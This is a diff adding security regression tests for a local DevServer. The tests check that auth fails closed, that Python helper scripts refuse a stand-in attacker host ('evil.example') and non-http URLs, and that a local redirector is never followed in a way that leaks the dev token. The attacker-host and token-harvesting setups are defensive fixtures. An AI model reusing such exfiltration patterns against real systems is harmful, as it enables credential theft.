@@ -366,12 +366,77 @@ describe('DevServer /api/scaffold', () => {
     } finally {
       chmodSync(runDir, 0o700)
     }
+
+    // INGRESS-05: Overlapping start() calls on the SAME DevServer instance must not bind a second listener,
+    // overwrite the first listener/token, or leave an open listener serving protected routes without auth after stop().
+    const singleInstance = new DevServer({
+      providerLoader: duplicateLoader,
+      cdpManagers: new Map(),
+      logFn: () => {},
+      configDir: tempRoot,
+    })
+    server = singleInstance
+    const overlapPortA = 20000 + Math.floor(Math.random() * 10000)
+    const overlapPortB = overlapPortA + 1
+    await Promise.all([singleInstance.start(overlapPortA), singleInstance.start(overlapPortB)])
+    const activeToken = singleInstance.getAuthToken() || ''
+    expect(activeToken).toMatch(/^add_/)
+    expect(existsSync(devServerAuthFilePath(tempRoot, overlapPortA))).toBe(true)
+    expect(existsSync(devServerAuthFilePath(tempRoot, overlapPortB))).toBe(false)
+
+    // Port A is authenticated; Port B was never bound
+    const resOnA = await rawDevRequest(overlapPortA, {
+      method: 'GET',
+      path: '/api/status',
+      headers: { [ADHDEV_DEV_SERVER_TOKEN_HEADER]: activeToken },
+    })
+    expect(resOnA.status).toBe(200)
+    await expect(
+      rawDevRequest(overlapPortB, { method: 'GET', path: '/api/status' }),
+    ).rejects.toThrow()
+
+    // Even if authToken is cleared without explicitAuthToken === null, requests fail closed (401)
+    ;(singleInstance as any).authToken = null
+    const resWithNullToken = await rawDevRequest(overlapPortA, {
+      method: 'GET',
+      path: '/api/status',
+    })
+    expect(resWithNullToken.status).toBe(401)
+    ;(singleInstance as any).authToken = activeToken
+
+    // After stop(), Port A is closed and no listener remains open
+    singleInstance.stop()
+    server = null
+    await expect(
+      rawDevRequest(overlapPortA, { method: 'GET', path: '/api/status' }),
+    ).rejects.toThrow()
   })
 
-  it('INGRESS-02: verify_provider.py and verify_cli_provider.py discover the local DevServer token and authenticate api_call and capture_screenshot against a live DevServer fixture', async () => {
+  it('INGRESS-02 / INGRESS-06 / INGRESS-08: verify_provider.py and verify_cli_provider.py authenticate against loopback DevServer, verify screenshot output, and refuse non-loopback or redirect credential exfiltration', async () => {
     tempRoot = mkdtempSync(path.join(os.tmpdir(), 'adhdev-devserver-py-verify-'))
-    const started = await startServer(tempRoot)
-    server = started.server
+    const loader = new ProviderLoader({ userDir: tempRoot, disableUpstream: true })
+    loader.loadAll()
+    const fakeWebp = Buffer.from('RIFF\x14\x00\x00\x00WEBPVP8 \x08\x00\x00\x00fakewebp', 'binary')
+    let screenshotCaptures = 0
+    const fakeCdpManager: any = {
+      isConnected: true,
+      send: async () => ({ cssVisualViewport: { clientWidth: 1280, clientHeight: 720 } }),
+      captureScreenshot: async () => {
+        screenshotCaptures += 1
+        return fakeWebp
+      },
+    }
+    const cdpManagers = new Map<string, any>([['demo-ide', fakeCdpManager]])
+    const devSrv = new DevServer({
+      providerLoader: loader,
+      cdpManagers,
+      logFn: () => {},
+      configDir: tempRoot,
+    })
+    const port = 20000 + Math.floor(Math.random() * 10000)
+    await devSrv.start(port)
+    server = devSrv
+    const token = devSrv.getAuthToken() || ''
 
     const repoRoot = path.resolve(__dirname, '../../../../..')
     const scriptsDir = path.join(repoRoot, 'scripts')
@@ -379,39 +444,117 @@ describe('DevServer /api/scaffold', () => {
       return
     }
 
-    const pySnippet = [
-      'import sys, os, json',
-      `sys.path.insert(0, ${JSON.stringify(scriptsDir)})`,
-      'import verify_provider as vp',
-      'import verify_cli_provider as vcp',
-      's1 = vp.api_call("/api/status", method="GET")',
-      's2 = vcp.api_call("/api/providers", method="GET")',
-      'vp.capture_screenshot("demo-ide", "test")',
-      'print(json.dumps({"vp_devMode": s1.get("devMode"), "vcp_has_providers": isinstance(s2.get("providers"), list), "tok1": vp._read_dev_token(), "tok2": vcp._read_dev_token()}))',
-    ].join('\n')
-
-    const pyRes = await new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve, reject) => {
-      const child = spawn('python3', ['-c', pySnippet], {
-        windowsHide: true,
-        env: {
-          ...process.env,
-          ADHDEV_CONFIG_DIR: tempRoot!,
-          ADHDEV_DEV_SERVER_URL: `http://127.0.0.1:${started.port}`,
-          ADHDEV_DEV_SERVER_AUTH_FILE: devServerAuthFilePath(tempRoot!, started.port),
-        },
-      })
-      let stdout = ''
-      let stderr = ''
-      child.stdout.on('data', (d) => { stdout += d.toString() })
-      child.stderr.on('data', (d) => { stderr += d.toString() })
-      child.on('error', reject)
-      child.on('close', (status) => resolve({ status, stdout, stderr }))
+    // Stand up a local redirector server on another port to verify redirects are refused and never leak headers
+    let redirectTargetHits = 0
+    let redirectTargetLeakedToken: string | undefined
+    const redirectServer = http.createServer((req, res) => {
+      if (req.url?.startsWith('/target')) {
+        redirectTargetHits += 1
+        redirectTargetLeakedToken = req.headers[ADHDEV_DEV_SERVER_TOKEN_HEADER] as string | undefined
+        res.writeHead(200, { 'Content-Type': 'application/json' })
+        res.end(JSON.stringify({ leaked: true }))
+        return
+      }
+      res.writeHead(302, { Location: `http://127.0.0.1:${redirectPort}/target` })
+      res.end()
     })
-    expect(pyRes.status, pyRes.stderr).toBe(0)
-    const parsed = JSON.parse(pyRes.stdout.trim().split('\n').pop() || '{}')
-    expect(parsed.vp_devMode).toBe(true)
-    expect(parsed.vcp_has_providers).toBe(true)
-    expect(parsed.tok1).toBe(started.token)
-    expect(parsed.tok2).toBe(started.token)
+    const redirectPort = await new Promise<number>((resolve) => {
+      redirectServer.listen(0, '127.0.0.1', () => {
+        const addr = redirectServer.address()
+        resolve(typeof addr === 'object' && addr ? addr.port : 0)
+      })
+    })
+    writeFileSync(devServerAuthFilePath(tempRoot, redirectPort), token, { mode: 0o600 })
+
+    const screenshotLabel = `ing08_${process.pid}_${Date.now()}`
+    const expectedScreenshotFile = `/tmp/screenshot_demo-ide_${screenshotLabel}.webp`
+
+    try {
+      const pySnippet = [
+        'import sys, os, json',
+        `sys.path.insert(0, ${JSON.stringify(scriptsDir)})`,
+        'import verify_provider as vp',
+        'import verify_cli_provider as vcp',
+        's1 = vp.api_call("/api/status", method="GET")',
+        's2 = vcp.api_call("/api/providers", method="GET")',
+        `shot_path = vp.capture_screenshot("demo-ide", ${JSON.stringify(screenshotLabel)})`,
+        // INGRESS-06: Non-loopback URLs must be rejected before reading or sending any local token
+        'vp.API = "http://evil.example:19280"',
+        'vcp.API = "http://evil.example:19280"',
+        'evil_vp = vp.api_call("/api/status", method="GET")',
+        'evil_vcp = vcp.api_call("/api/status", method="GET")',
+        'evil_shot = vp.capture_screenshot("demo-ide", "evil")',
+        'vp.API = "https://127.0.0.1:19280"',
+        'https_vp = vp.api_call("/api/status", method="GET")',
+        // INGRESS-06: Auth file env pointing to a different port's filename is ignored for the target port
+        `vp.API = "http://127.0.0.1:${port}"`,
+        `vcp.API = "http://127.0.0.1:${port}"`,
+        'os.environ["ADHDEV_DEV_SERVER_AUTH_FILE"] = "/tmp/unrelated-secret-file"',
+        'tok1 = vp._read_dev_token()',
+        'tok2 = vcp._read_dev_token()',
+        // INGRESS-06: Redirect responses must be rejected without following Location
+        `vp.API = "http://127.0.0.1:${redirectPort}"`,
+        `vcp.API = "http://127.0.0.1:${redirectPort}"`,
+        'redir_vp = vp.api_call("/api/status", method="GET")',
+        'redir_vcp = vcp.api_call("/api/status", method="GET")',
+        'redir_shot = vp.capture_screenshot("demo-ide", "redir")',
+        'print(json.dumps({',
+        '  "vp_devMode": s1.get("devMode"),',
+        '  "vcp_has_providers": isinstance(s2.get("providers"), list),',
+        '  "shot_path": shot_path,',
+        '  "tok1": tok1,',
+        '  "tok2": tok2,',
+        '  "evil_vp_err": evil_vp.get("error", ""),',
+        '  "evil_vcp_err": evil_vcp.get("error", ""),',
+        '  "evil_shot": evil_shot,',
+        '  "https_vp_err": https_vp.get("error", ""),',
+        '  "redir_vp_err": redir_vp.get("error", ""),',
+        '  "redir_vcp_err": redir_vcp.get("error", ""),',
+        '  "redir_shot": redir_shot,',
+        '}))',
+      ].join('\n')
+
+      const pyRes = await new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve, reject) => {
+        const child = spawn('python3', ['-c', pySnippet], {
+          windowsHide: true,
+          env: {
+            ...process.env,
+            ADHDEV_CONFIG_DIR: tempRoot!,
+            ADHDEV_DEV_SERVER_URL: `http://127.0.0.1:${port}`,
+            ADHDEV_DEV_SERVER_AUTH_FILE: devServerAuthFilePath(tempRoot!, port),
+          },
+        })
+        let stdout = ''
+        let stderr = ''
+        child.stdout.on('data', (d) => { stdout += d.toString() })
+        child.stderr.on('data', (d) => { stderr += d.toString() })
+        child.on('error', reject)
+        child.on('close', (status) => resolve({ status, stdout, stderr }))
+      })
+      expect(pyRes.status, pyRes.stderr).toBe(0)
+      const parsed = JSON.parse(pyRes.stdout.trim().split('\n').pop() || '{}')
+      expect(parsed.vp_devMode).toBe(true)
+      expect(parsed.vcp_has_providers).toBe(true)
+      expect(parsed.tok1).toBe(token)
+      expect(parsed.tok2).toBe(token)
+      // INGRESS-08: Verify authenticated screenshot reached handler and wrote expected WebP binary
+      expect(screenshotCaptures).toBe(1)
+      expect(parsed.shot_path).toBe(expectedScreenshotFile)
+      expect(existsSync(expectedScreenshotFile)).toBe(true)
+      expect(readFileSync(expectedScreenshotFile).equals(fakeWebp)).toBe(true)
+      // INGRESS-06: Verify non-loopback and non-http URLs are refused and redirects are never followed
+      expect(parsed.evil_vp_err).toMatch(/Refusing non-loopback DevServer host/)
+      expect(parsed.evil_vcp_err).toMatch(/Refusing non-loopback DevServer host/)
+      expect(parsed.evil_shot).toBeNull()
+      expect(parsed.https_vp_err).toMatch(/Refusing non-http DevServer URL/)
+      expect(parsed.redir_vp_err).toMatch(/302/)
+      expect(parsed.redir_vcp_err).toMatch(/302/)
+      expect(parsed.redir_shot).toBeNull()
+      expect(redirectTargetHits).toBe(0)
+      expect(redirectTargetLeakedToken).toBeUndefined()
+    } finally {
+      redirectServer.close()
+      try { rmSync(expectedScreenshotFile, { force: true }) } catch { /* ignore */ }
+    }
   })
 })
